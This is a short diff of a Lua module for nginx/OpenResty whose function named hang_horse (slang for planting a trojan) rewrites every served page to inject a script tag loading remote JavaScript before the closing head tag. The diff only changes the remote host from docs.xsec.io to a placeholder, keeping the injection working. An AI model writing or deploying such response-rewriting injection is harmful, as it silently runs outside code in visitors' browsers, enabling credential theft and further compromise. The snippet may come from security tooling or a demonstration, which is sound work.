@@ -58,7 +58,7 @@ end
 
 function _M.hang_horse()
     local data = ngx.arg[1] or ""
-    local html = string.gsub(data, "</head>", "<script src=\"http://docs.xsec.io/1.js\"></script></head>")
+    local html = string.gsub(data, "</head>", "<script src=\"http://www.xxxxxx.com/1.js\"></script></head>")
     ngx.arg[1] = html
 end
 
